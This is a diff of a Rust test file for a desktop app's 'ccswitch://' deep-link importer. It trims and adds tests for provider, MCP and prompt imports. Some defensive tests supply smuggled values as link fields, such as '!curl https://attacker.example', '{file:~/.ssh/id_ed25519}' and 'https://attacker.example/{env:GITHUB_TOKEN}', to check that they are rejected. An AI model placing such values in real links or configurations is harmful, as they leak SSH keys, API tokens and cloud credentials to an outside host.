@@ -30,12 +30,15 @@ impl TestHomeGuard {
         env::set_var("USERPROFILE", dir.path());
         env::set_var("CC_SWITCH_TEST_HOME", dir.path());
 
-        Self {
+        let guard = Self {
             _dir: dir,
             original_home,
             original_userprofile,
             original_test_home,
-        }
+        };
+        crate::settings::update_settings(crate::settings::AppSettings::default())
+            .expect("initialize isolated settings");
+        guard
     }
 }
 
@@ -53,6 +56,7 @@ impl Drop for TestHomeGuard {
             Some(value) => env::set_var("HOME", value),
             None => env::remove_var("HOME"),
         }
+        let _ = crate::settings::reload_settings();
     }
 }
 
@@ -137,46 +141,6 @@ fn test_parse_deeplink_with_notes() {
 }
 
 #[test]
-fn pi_provider_link_without_a_model_is_rejected_up_front() {
-    let url = "ccswitch://v1/import?resource=provider&app=pi&name=Pi&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test";
-    let err = parse_deeplink_url(url).expect_err("a Pi node without models is unusable");
-    assert!(err.to_string().contains("model"), "{err}");
-}
-
-#[test]
-fn test_parse_grokbuild_provider() {
-    use super::provider::build_provider_from_request;
-
-    let url = "ccswitch://v1/import?resource=provider&app=grokbuild&name=Grok%20Relay&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=secret&model=grok-4.5";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(request.app.as_deref(), Some("grokbuild"));
-    assert_eq!(request.name.as_deref(), Some("Grok Relay"));
-    assert_eq!(
-        request.endpoint.as_deref(),
-        Some("https://api.example.com/v1")
-    );
-    assert_eq!(request.api_key.as_deref(), Some("secret"));
-    assert_eq!(request.model.as_deref(), Some("grok-4.5"));
-
-    let provider = build_provider_from_request(&AppType::GrokBuild, &request).unwrap();
-    let config = provider.settings_config["config"].as_str().unwrap();
-    let document = config.parse::<toml::Value>().unwrap();
-    let model = &document["model"]["grok-4.5"];
-
-    assert_eq!(document["models"]["default"].as_str(), Some("grok-4.5"));
-    assert_eq!(
-        model["base_url"].as_str(),
-        Some("https://api.example.com/v1")
-    );
-    assert_eq!(model["name"].as_str(), Some("Grok Relay"));
-    assert_eq!(model["api_key"].as_str(), Some("secret"));
-    assert_eq!(model["api_backend"].as_str(), Some("responses"));
-    assert_eq!(model["context_window"].as_integer(), Some(500_000));
-}
-
-#[test]
 fn test_parse_invalid_scheme() {
     let url = "https://v1/import?resource=provider&app=claude&name=Test";
 
@@ -219,17 +183,6 @@ fn test_parse_rejects_config_url_up_front() {
     assert!(err.to_string().contains("configUrl"), "{err}");
 }
 
-/// 下游 parse_mcp_apps 与 McpService 都支持 Pi / MiniMax Code / Oh My Pi，解析层不能先把它们拦掉
-#[test]
-fn test_parse_mcp_deeplink_accepts_pi_mcode_and_omp() {
-    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
-    let url = format!("ccswitch://v1/import?resource=mcp&apps=claude,pi,mcode,omp&config={config}");
-
-    let request = parse_deeplink_url(&url).expect("pi, mcode and ohmpi are valid MCP targets");
-    let apps = parse_mcp_apps(request.apps.as_deref().unwrap()).unwrap();
-    assert!(apps.claude && apps.pi && apps.mcode && apps.omp);
-}
-
 /// DeepSeek Harness 的 MCP 链接写进 DSH 的标记（Web 与 Desktop 共用）
 #[test]
 fn test_parse_mcp_deeplink_accepts_dsh() {
@@ -243,28 +196,6 @@ fn test_parse_mcp_deeplink_accepts_dsh() {
                 .dsh
         );
     }
-}
-
-/// 供应商链接对 Oh My Pi 明确拒绝，而不是落到「Invalid provider app type」。
-#[test]
-fn test_parse_provider_deeplink_refuses_omp_with_guidance() {
-    for app in ["omp", "ohmypi", "oh-my-pi", "oh_my_pi"] {
-        let url =
-            format!("ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com");
-        let err = parse_deeplink_url(&url).unwrap_err().to_string();
-        assert!(
-            err.contains("Oh My Pi provider page"),
-            "{app} should be sent to the Oh My Pi page, got: {err}"
-        );
-    }
-}
-
-#[test]
-fn test_parse_prompt_deeplink_accepts_mcode() {
-    let url = "ccswitch://v1/import?resource=prompt&app=mcode&name=Rules&content=IyBoaQ%3D%3D";
-
-    let request = parse_deeplink_url(url).expect("MiniMax Code has a prompt panel");
-    assert_eq!(request.app.as_deref(), Some("mcode"));
 }
 
 /// 读取不清除，按编号确认才清除：前端读到后、显示前被打断（effect 重建、窗口销毁），
@@ -344,109 +275,6 @@ fn test_infer_homepage() {
 // =============================================================================
 // Provider Tests
 // =============================================================================
-
-#[test]
-fn test_build_gemini_provider_with_model() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("gemini".to_string()),
-        name: Some("Test Gemini".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("test-api-key".to_string()),
-        icon: None,
-        model: Some("gemini-2.0-flash".to_string()),
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();
-
-    // Verify provider basic info
-    assert_eq!(provider.name, "Test Gemini");
-    assert_eq!(
-        provider.website_url,
-        Some("https://example.com".to_string())
-    );
-
-    // Verify settings_config structure
-    let env = provider.settings_config["env"].as_object().unwrap();
-    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
-    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
-    assert_eq!(env["GEMINI_MODEL"], "gemini-2.0-flash");
-}
-
-#[test]
-fn test_build_gemini_provider_without_model() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("gemini".to_string()),
-        name: Some("Test Gemini".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("test-api-key".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();
-
-    let env = provider.settings_config["env"].as_object().unwrap();
-    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
-    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
-    // Model should not be present
-    assert!(env.get("GEMINI_MODEL").is_none());
-}
 
 #[test]
 fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
@@ -813,38 +641,6 @@ experimental_bearer_token = "sk-rightcode"
 }
 
 #[test]
-fn test_parse_and_merge_config_grokbuild() {
-    let config_toml = r#"[models]
-default = "grok-profile"
-
-[model."grok-profile"]
-model = "grok-upstream"
-base_url = "https://grok.example/v1"
-name = "Grok Relay"
-api_key = "sk-grok"
-api_backend = "responses"
-context_window = 500000
-"#;
-    let config_json = serde_json::json!({ "config": config_toml }).to_string();
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("grokbuild".to_string()),
-        name: Some("Grok Relay".to_string()),
-        config: Some(BASE64_STANDARD.encode(config_json.as_bytes())),
-        config_format: Some("json".to_string()),
-        ..Default::default()
-    };
-
-    let merged = parse_and_merge_config(&request).expect("merge Grok Build config");
-
-    assert_eq!(merged.api_key.as_deref(), Some("sk-grok"));
-    assert_eq!(merged.endpoint.as_deref(), Some("https://grok.example/v1"));
-    assert_eq!(merged.model.as_deref(), Some("grok-upstream"));
-    assert_eq!(merged.homepage.as_deref(), Some("https://grok.example"));
-}
-
-#[test]
 fn test_parse_and_merge_config_url_override() {
     let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-old","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1"}}"#;
     let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());
@@ -1036,7 +832,7 @@ fn test_import_prompt_allows_space_in_base64_content() {
 
     let prompt_id = import_prompt_from_deeplink(&state, request.clone()).expect("import prompt");
 
-    let prompts = state.db.get_prompts("codex").expect("get prompts");
+    let prompts = state.db.get_prompts(&AppType::Codex).expect("get prompts");
     let prompt = prompts.get(&prompt_id).expect("prompt saved");
 
     assert_eq!(prompt.content, ">>>");
@@ -1049,23 +845,11 @@ fn test_import_prompt_allows_space_in_base64_content() {
 
 #[test]
 fn test_parse_mcp_apps() {
-    let apps = parse_mcp_apps("claude,codex").unwrap();
-    assert!(apps.claude);
-    assert!(apps.codex);
-    assert!(!apps.gemini);
-
-    let apps = parse_mcp_apps("gemini").unwrap();
-    assert!(!apps.claude);
-    assert!(!apps.codex);
-    assert!(apps.gemini);
-
-    let apps = parse_mcp_apps("grokbuild,opencode,hermes").unwrap();
-    assert!(apps.grokbuild);
-    assert!(apps.opencode);
-    assert!(apps.hermes);
-
-    let err = parse_mcp_apps("invalid").unwrap_err();
-    assert!(err.to_string().contains("Invalid app"));
+    let apps = parse_mcp_apps("claude,codex,opencode,dsh,agy").unwrap();
+    assert!(apps.claude && apps.codex && apps.opencode && apps.dsh && apps.agy);
+    assert!(parse_mcp_apps("gemini").is_err());
+    assert!(parse_mcp_apps("grokbuild").is_err());
+    assert!(parse_mcp_apps("invalid").is_err());
 }
 
 #[test]
@@ -1087,18 +871,6 @@ fn test_parse_prompt_deeplink() {
 }
 
 #[test]
-fn test_parse_grokbuild_prompt_deeplink() {
-    let content_b64 = BASE64_STANDARD.encode("Grok instructions");
-    let url = format!(
-        "ccswitch://v1/import?resource=prompt&app=grokbuild&name=test&content={content_b64}"
-    );
-
-    let request = parse_deeplink_url(&url).expect("parse Grok Build prompt deeplink");
-
-    assert_eq!(request.app.as_deref(), Some("grokbuild"));
-}
-
-#[test]
 fn test_parse_mcp_deeplink() {
     let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
     let config_b64 = BASE64_STANDARD.encode(config);
@@ -1112,34 +884,6 @@ fn test_parse_mcp_deeplink() {
     assert_eq!(request.apps.unwrap(), "claude,codex");
     assert_eq!(request.config.unwrap(), config_b64);
     assert!(request.enabled.unwrap());
-}
-
-#[test]
-fn test_parse_grokbuild_mcp_deeplink() {
-    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config);
-    let url = format!(
-        "ccswitch://v1/import?resource=mcp&apps=grokbuild&config={config_b64}&enabled=true"
-    );
-
-    let request = parse_deeplink_url(&url).expect("parse Grok Build MCP deeplink");
-
-    assert_eq!(request.apps.as_deref(), Some("grokbuild"));
-}
-
-/// 入口白名单要和下层 `parse_mcp_apps` 一致，支持 MCP 的 MiniMax Code、Pi 不能在这里被拒
-#[test]
-fn test_parse_mcode_and_pi_mcp_deeplink() {
-    let config = r#"{"mcpServers":{"test":{"command":"echo"}}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config);
-    let url =
-        format!("ccswitch://v1/import?resource=mcp&apps=mcode,pi&config={config_b64}&enabled=true");
-
-    let request = parse_deeplink_url(&url).expect("parse MiniMax Code / Pi MCP deeplink");
-    let apps = request.apps.as_deref().unwrap();
-    assert_eq!(apps, "mcode,pi");
-    let parsed = crate::deeplink::mcp::parse_mcp_apps(apps).unwrap();
-    assert!(parsed.mcode && parsed.pi);
 }
 
 #[test]
@@ -1536,108 +1280,6 @@ fn test_codex_link_accepts_a_whole_config_toml() {
     );
 }
 
-// ============ Grok Build：链接附带的 config.toml ============
-
-fn import_grok_with_config(config_toml: &str) -> Result<serde_json::Value, crate::error::AppError> {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("grokbuild".to_string()),
-        name: Some("Relay Card".to_string()),
-        endpoint: Some("https://api.relay.example/v1".to_string()),
-        api_key: Some("xai-link".to_string()),
-        config: Some(
-            BASE64_STANDARD.encode(serde_json::json!({ "config": config_toml }).to_string()),
-        ),
-        config_format: Some("json".to_string()),
-        ..Default::default()
-    };
-    let merged = parse_and_merge_config(&request)?;
-    Ok(build_provider_from_request(&AppType::GrokBuild, &merged)?.settings_config)
-}
-
-#[test]
-fn test_grok_link_config_keeps_the_selected_profile_fields() {
-    // #6457：显示名、说明、窗口等来自链接的模型表；地址和 Key 用链接参数
-    let settings = import_grok_with_config(concat!(
-        "[models]\ndefault = \"grok-4.6\"\n\n",
-        "[model.\"grok-4.6\"]\nmodel = \"grok-4.6\"\nname = \"Grok 4.6 (Relay)\"\n",
-        "description = \"Fast coding model\"\n",
-        "base_url = \"https://untrusted.example/v1\"\napi_key = \"sk-in-config\"\n",
-        "env_key = \"RELAY_KEY\"\n",
-        "api_backend = \"chat_completions\"\ncontext_window = 256000\n",
-        "reasoning_summary = \"auto\"\nextra_headers = { \"x-relay\" = \"1\" }\n\n",
-        "[model.\"grok-4.5\"]\nmodel = \"grok-4.5\"\nname = \"Grok 4.5\"\n",
-        "base_url = \"https://untrusted.example/v1\"\napi_key = \"sk-in-config\"\n",
-        "api_backend = \"responses\"\ncontext_window = 500000\n",
-    ))
-    .unwrap();
-
-    let text = settings["config"].as_str().unwrap();
-    let doc: toml_edit::DocumentMut = text.parse().unwrap();
-    assert_eq!(doc["models"]["default"].as_str(), Some("grok-4.6"));
-    let table = &doc["model"]["grok-4.6"];
-    assert_eq!(table["name"].as_str(), Some("Grok 4.6 (Relay)"));
-    assert_eq!(table["description"].as_str(), Some("Fast coding model"));
-    assert_eq!(table["api_backend"].as_str(), Some("chat_completions"));
-    assert_eq!(table["context_window"].as_integer(), Some(256000));
-    assert_eq!(table["reasoning_summary"].as_str(), Some("auto"));
-    assert_eq!(table["extra_headers"]["x-relay"].as_str(), Some("1"));
-    assert_eq!(
-        table["base_url"].as_str(),
-        Some("https://api.relay.example/v1")
-    );
-    assert_eq!(table["api_key"].as_str(), Some("xai-link"));
-    assert!(table.get("env_key").is_none(), "{text}");
-    // 一个供应商只拥有一张模型表，其余的不导入
-    assert!(doc["model"].get("grok-4.5").is_none(), "{text}");
-
-    // 行能被投影（切换时写进 live 的就是这张表）
-    let projection = crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
-    assert_eq!(projection.table_name(), Some("grok-4.6"));
-}
-
-#[test]
-fn test_grok_link_config_fills_template_defaults_for_missing_fields() {
-    let settings = import_grok_with_config(
-        "[models]\ndefault = \"relay\"\n\n[model.relay]\nmodel = \"relay-model\"\n",
-    )
-    .unwrap();
-    let doc: toml_edit::DocumentMut = settings["config"].as_str().unwrap().parse().unwrap();
-    let table = &doc["model"]["relay"];
-    assert_eq!(table["name"].as_str(), Some("Relay Card"));
-    assert_eq!(table["model"].as_str(), Some("relay-model"));
-    assert_eq!(
-        table["api_backend"].as_str(),
-        Some(crate::grok_config::DEFAULT_API_BACKEND)
-    );
-    assert_eq!(
-        table["context_window"].as_integer(),
-        Some(crate::grok_config::DEFAULT_CONTEXT_WINDOW)
-    );
-    crate::live::project::grok::GrokProjection::of(&settings, false).unwrap();
-}
-
-#[test]
-fn test_grok_link_config_rejects_credential_providers_and_local_files() {
-    for (key, line) in [
-        ("auth_provider", "auth_provider = \"corp-sso\"\n"),
-        (
-            "env_http_headers",
-            "env_http_headers = { \"x-key\" = \"HOME\" }\n",
-        ),
-        ("mtls_cert_dir", "mtls_cert_dir = \"/etc/ssl/private\"\n"),
-    ] {
-        let config = format!(
-            "[models]\ndefault = \"relay\"\n\n[model.relay]\nmodel = \"relay-model\"\n{line}"
-        );
-        let err = import_grok_with_config(&config).unwrap_err();
-        assert!(err.to_string().contains(key), "{key}: {err}");
-    }
-}
-
 // =============================================================================
 // apiFormat：一套取值，按应用换算
 // =============================================================================
@@ -1671,14 +1313,6 @@ fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
         ),
         ("opencode", "npm", "openai_responses", "@ai-sdk/openai"),
         ("opencode", "npm", "gemini_native", "@ai-sdk/google"),
-        ("openclaw", "api", "anthropic", "anthropic-messages"),
-        ("openclaw", "api", "openai_responses", "openai-responses"),
-        ("openclaw", "api", "gemini_native", "google-generative-ai"),
-        ("hermes", "api_mode", "anthropic", "anthropic_messages"),
-        ("hermes", "api_mode", "openai_responses", "codex_responses"),
-        ("pi", "api", "anthropic", "anthropic-messages"),
-        ("pi", "api", "openai_responses", "openai-responses"),
-        ("pi", "api", "gemini_native", "google-generative-ai"),
     ];
     for (app, field, format, expected) in cases {
         let provider = build_from_link(app, Some(format));
@@ -1691,17 +1325,12 @@ fn test_api_format_maps_to_each_additive_apps_own_protocol_field() {
 
 #[test]
 fn test_links_without_api_format_keep_each_apps_previous_protocol() {
-    let cases = [
-        ("opencode", "npm", "@ai-sdk/openai-compatible"),
-        ("openclaw", "api", "openai-completions"),
-        ("hermes", "api_mode", "chat_completions"),
-        ("pi", "api", "openai-completions"),
-    ];
+    let cases = [("opencode", "npm", "@ai-sdk/openai-compatible")];
     for (app, field, expected) in cases {
         let provider = build_from_link(app, None);
         assert_eq!(provider.settings_config[field], expected, "{app}");
     }
-    for app in ["claude", "codex", "grokbuild"] {
+    for app in ["claude", "codex"] {
         let provider = build_from_link(app, None);
         assert!(
             provider.meta.and_then(|meta| meta.api_format).is_none(),
@@ -1711,94 +1340,22 @@ fn test_links_without_api_format_keep_each_apps_previous_protocol() {
 }
 
 #[test]
-fn test_api_format_marks_routed_formats_on_claude_codex_and_grok() {
-    for (app, format) in [
-        ("claude", "openai_chat"),
-        ("claude", "gemini_native"),
-        ("codex", "openai_chat"),
-        ("codex", "anthropic"),
-        ("grokbuild", "openai_chat"),
-    ] {
-        let provider = build_from_link(app, Some(format));
-        assert_eq!(
-            provider.meta.and_then(|meta| meta.api_format).as_deref(),
-            Some(format),
-            "{app} apiFormat={format}"
-        );
-    }
-}
-
-#[test]
 fn test_api_format_rejects_unknown_values_and_unsupported_apps() {
-    for (app, format) in [
-        ("claude", "openai"),
-        ("codex", "gemini_native"),
-        ("grokbuild", "gemini_native"),
-        ("gemini", "openai_chat"),
-        ("hermes", "gemini_native"),
-    ] {
-        let err = parse_deeplink_url(&provider_link(app, Some(format)))
-            .expect_err("unsupported apiFormat must be rejected while parsing");
-        assert!(
-            err.to_string().contains("apiFormat"),
-            "{app}/{format}: {err}"
-        );
+    for app in ["claude", "codex", "opencode"] {
+        assert!(parse_deeplink_url(&provider_link(app, Some("unknown")))
+            .unwrap_err()
+            .to_string()
+            .contains("apiFormat"));
     }
-}
-
-#[test]
-fn test_pi_link_builds_a_models_json_node() {
-    let provider = build_from_link("pi", Some("anthropic"));
-    assert_eq!(
-        provider.settings_config,
-        serde_json::json!({
-            "name": "Example",
-            "baseUrl": "https://api.example.com/v1",
-            "apiKey": "sk-test",
-            "api": "anthropic-messages",
-            "models": [{ "id": "example-model", "name": "example-model" }],
-        })
-    );
-}
-
-// =============================================================================
-// enabled：确认框开关的值。累加式应用决定是否写进应用配置，不调用切换
-// =============================================================================
-
-fn import_pi_link(enabled: Option<bool>) -> (AppState, String) {
-    let mut request =
-        parse_deeplink_url(&provider_link("pi", Some("openai_chat"))).expect("parse link");
-    request.enabled = enabled;
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
-    let id = super::import_provider_from_deeplink(&state, request).expect("import Pi provider");
-    (state, id)
-}
-
-#[test]
-#[serial_test::serial]
-fn test_pi_link_with_the_toggle_off_is_saved_without_touching_models_json() {
-    let _home = TestHomeGuard::new();
-    let _agent = crate::pi_config::test_support::TestAgentDir::new();
-
-    let (state, id) = import_pi_link(Some(false));
-
-    assert!(state.db.get_provider_by_id(&id, "pi").unwrap().is_some());
-    assert!(!crate::pi_config::pi_provider_exists(&id).unwrap());
-}
-
-#[test]
-#[serial_test::serial]
-fn test_pi_link_with_the_toggle_on_or_unset_is_added_to_models_json() {
-    let _home = TestHomeGuard::new();
-    let _agent = crate::pi_config::test_support::TestAgentDir::new();
-
-    for enabled in [Some(true), None] {
-        let (_state, id) = import_pi_link(enabled);
-        let node = crate::pi_config::read_pi_native_provider(&id)
-            .unwrap()
-            .expect("node written to models.json");
-        assert_eq!(node["api"], "openai-completions", "{enabled:?}");
+    for app in ["gemini", "grokbuild", "hermes", "pi", "openclaw"] {
+        assert!(parse_deeplink_url(&provider_link(app, None)).is_err());
+    }
+    for app in ["claude", "codex"] {
+        let provider = build_from_link(app, Some("gemini_native"));
+        assert_eq!(
+            provider.meta.unwrap().api_format.as_deref(),
+            Some("gemini_native")
+        );
     }
 }
 
@@ -1823,11 +1380,6 @@ fn link_with(app: &str, param: &str, raw_value: &str) -> String {
 #[test]
 fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rejected() {
     for (app, param, value) in [
-        ("pi", "apiKey", "!printf review-fixture"),
-        ("pi", "apiKey", "  !curl https://attacker.example"),
-        ("pi", "apiKey", "$OPENAI_API_KEY"),
-        ("pi", "apiKey", "${AWS_SECRET_ACCESS_KEY}"),
-        ("pi", "model", "${HOME}"),
         ("opencode", "apiKey", "{file:~/.ssh/id_ed25519}"),
         ("opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
         (
@@ -1835,14 +1387,6 @@ fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rej
             "endpoint",
             "https://attacker.example/{env:GITHUB_TOKEN}",
         ),
-        (
-            "openclaw",
-            "endpoint",
-            "https://attacker.example/${OPENAI_API_KEY}",
-        ),
-        ("openclaw", "apiKey", "${OPENAI_API_KEY}"),
-        ("hermes", "apiKey", "${ANTHROPIC_API_KEY}"),
-        ("hermes", "name", "${HOME}"),
     ] {
         let err = parse_deeplink_url(&link_with(app, param, value))
             .expect_err("dynamic syntax must be rejected while parsing");
@@ -1856,8 +1400,6 @@ fn test_links_that_smuggle_commands_env_vars_or_files_into_additive_apps_are_rej
 #[test]
 fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
     for (app, param, value) in [
-        ("pi", "apiKey", "sk-abc$1def"),
-        ("pi", "apiKey", "sk-ends-with-!"),
         ("opencode", "apiKey", "sk-{not-a-reference}"),
         // 切换式应用的客户端不展开这些写法，照常导入
         ("claude", "apiKey", "!literal-key"),
@@ -1866,31 +1408,6 @@ fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
         parse_deeplink_url(&link_with(app, param, value))
             .unwrap_or_else(|err| panic!("{app}/{param}={value} should parse: {err}"));
     }
-}
-
-#[test]
-fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests() {
-    use super::provider::build_provider_from_request;
-
-    // config 里补来的 Key 在合并时就拒绝
-    let config = BASE64_STANDARD.encode(r#"{"apiKey":"{file:~/.aws/credentials}"}"#);
-    let url = format!(
-        "ccswitch://v1/import?resource=provider&app=opencode&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&model=m&config={config}"
-    );
-    let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
-    assert!(parse_and_merge_config(&request).is_err());
-
-    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
-    let request = DeepLinkImportRequest {
-        resource: "provider".to_string(),
-        app: Some("pi".to_string()),
-        name: Some("Example".to_string()),
-        endpoint: Some("https://api.example.com/v1".to_string()),
-        api_key: Some("!printf review-fixture".to_string()),
-        model: Some("m".to_string()),
-        ..Default::default()
-    };
-    assert!(build_provider_from_request(&AppType::Pi, &request).is_err());
 }
 
 // =============================================================================
@@ -1916,7 +1433,7 @@ fn test_first_switch_mode_provider_stays_inactive_when_the_toggle_is_off() {
 
         assert!(state
             .db
-            .get_provider_by_id(&id, "claude")
+            .get_provider_by_id(&id, &AppType::Claude)
             .unwrap()
             .is_some());
         let current = crate::mode::current::provider_for(
@@ -1989,7 +1506,11 @@ fn test_import_stores_a_valid_custom_icon_and_rejects_a_broken_one() {
     let db = Arc::new(Database::memory().expect("create memory db"));
     let state = AppState::new(db);
     let id = super::import_provider_from_deeplink(&state, request).expect("import provider");
-    let stored = state.db.get_provider_by_id(&id, "claude").unwrap().unwrap();
+    let stored = state
+        .db
+        .get_provider_by_id(&id, &AppType::Claude)
+        .unwrap()
+        .unwrap();
     assert_eq!(stored.icon.as_deref(), Some(icon.as_str()));
 
     // 截断的 PNG：保存校验拒绝
@@ -2018,25 +1539,6 @@ fn imported_usage_script(
         .unwrap()
         .meta
         .and_then(|meta| meta.usage_script)
-}
-
-#[test]
-fn test_deeplink_coding_plan_endpoint_enables_token_plan_by_default() {
-    // 和在应用里新建一样：套餐地址默认按套餐额度查询，所有应用一视同仁
-    for (app, app_type) in [
-        ("claude", AppType::Claude),
-        ("codex", AppType::Codex),
-        ("opencode", AppType::OpenCode),
-        ("hermes", AppType::Hermes),
-    ] {
-        let request = coding_plan_request(app, "https://api.kimi.com/coding/v1");
-        let script = imported_usage_script(app_type, &request)
-            .unwrap_or_else(|| panic!("{app} 应自动开启套餐用量"));
-        assert!(script.enabled, "{app}");
-        assert_eq!(script.template_type.as_deref(), Some("token_plan"));
-        assert_eq!(script.coding_plan_provider.as_deref(), Some("kimi"));
-        assert!(script.code.is_empty());
-    }
 }
 
 #[test]
@@ -2149,6 +1651,8 @@ fn agy_deeplink_accepts_flat_env_and_rejects_invalid_env() {
 #[serial_test::serial]
 fn agy_deeplink_mcp_import_merges_apps_and_writes_native_config() {
     let _home = TestHomeGuard::new();
+    // Native MCP sync only writes to clients already installed in this home.
+    std::fs::create_dir_all(crate::agy_config::agy_dir()).unwrap();
     let db = Arc::new(Database::memory().unwrap());
     let state = AppState::new(db.clone());
     let config = BASE64_URL_SAFE_NO_PAD
@@ -2171,30 +1675,91 @@ fn agy_deeplink_mcp_import_merges_apps_and_writes_native_config() {
     )
     .unwrap();
     assert_eq!(native["mcpServers"]["fixture"]["command"], "echo");
-    assert!(parse_mcp_apps("agy,gemini").unwrap().agy);
+    assert!(parse_mcp_apps("agy,gemini").is_err());
     assert!(parse_mcp_apps("agy,invalid").is_err());
 }
 
 #[test]
 #[serial_test::serial]
-fn agy_deeplink_prompt_import_respects_activation() {
+fn deeplink_mcp_reads_existing_servers_after_acquiring_switch_locks() {
+    let _home = TestHomeGuard::new();
+    let state = Arc::new(AppState::new(Arc::new(Database::memory().unwrap())));
+    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fixture":{"command":"echo"}}}"#);
+    let request = parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=mcp&apps=codex&config={config}"
+    ))
+    .unwrap();
+    super::mcp::import_mcp_from_deeplink(&state, request.clone()).unwrap();
+    let guard = futures::executor::block_on(state.operations.lock_for_app("codex"));
+    let (started_send, started_recv) = std::sync::mpsc::channel();
+    let (finished_send, finished_recv) = std::sync::mpsc::channel();
+    let importing_state = state.clone();
+    let importing = std::thread::spawn(move || {
+        started_send.send(()).unwrap();
+        let result = super::mcp::import_mcp_from_deeplink(&importing_state, request);
+        finished_send.send(result).unwrap();
+    });
+    started_recv
+        .recv_timeout(std::time::Duration::from_secs(5))
+        .unwrap();
+    assert!(finished_recv
+        .recv_timeout(std::time::Duration::from_millis(100))
+        .is_err());
+    let mut server = state.db.get_all_mcp_servers().unwrap()["fixture"].clone();
+    server.name = "concurrent edit".into();
+    server.apps.agy = true;
+
+    state.db.save_mcp_server(&server).unwrap();
+    drop(guard);
+    let result = finished_recv
+        .recv_timeout(std::time::Duration::from_secs(5))
+        .unwrap()
+        .unwrap();
+    importing.join().unwrap();
+    assert_eq!(result.imported_count, 1);
+    let rows = state.db.get_all_mcp_servers().unwrap();
+    assert_eq!(rows["fixture"].name, "concurrent edit");
+    assert!(rows["fixture"].apps.agy);
+}
+
+#[test]
+#[serial_test::serial]
+fn repeated_deeplink_prompts_use_unique_ids_and_second_timestamps() {
     let _home = TestHomeGuard::new();
     let state = AppState::new(Arc::new(Database::memory().unwrap()));
-    let content = BASE64_URL_SAFE_NO_PAD.encode("Agy instructions");
-    let path = crate::prompt_files::prompt_file_path(&AppType::Agy).unwrap();
-    for enabled in [false, true] {
-        let request = parse_deeplink_url(&format!("ccswitch://v1/import?resource=prompt&app=agy&name=Test-{enabled}&content={content}&enabled={enabled}")).unwrap();
-        let id = import_prompt_from_deeplink(&state, request).unwrap();
-        assert_eq!(
-            state.db.get_prompts("agy").unwrap()[&id].content,
-            "Agy instructions"
-        );
-        assert_eq!(path.exists(), enabled);
+    let content = BASE64_URL_SAFE_NO_PAD.encode("instructions");
+    let request = parse_deeplink_url(&format!(
+        "ccswitch://v1/import?resource=prompt&app=codex&name=Repeated&content={content}"
+    ))
+    .unwrap();
+    let first_id = import_prompt_from_deeplink(&state, request.clone()).unwrap();
+    let second_id = import_prompt_from_deeplink(&state, request).unwrap();
+    assert_ne!(first_id, second_id);
+    let prompts = state.db.get_prompts(&AppType::Codex).unwrap();
+    assert_eq!(prompts.len(), 2);
+    let now = chrono::Utc::now().timestamp();
+    for prompt in prompts.values() {
+        assert_eq!(prompt.content, "instructions");
+        assert!((now - prompt.created_at.unwrap()).abs() < 60);
     }
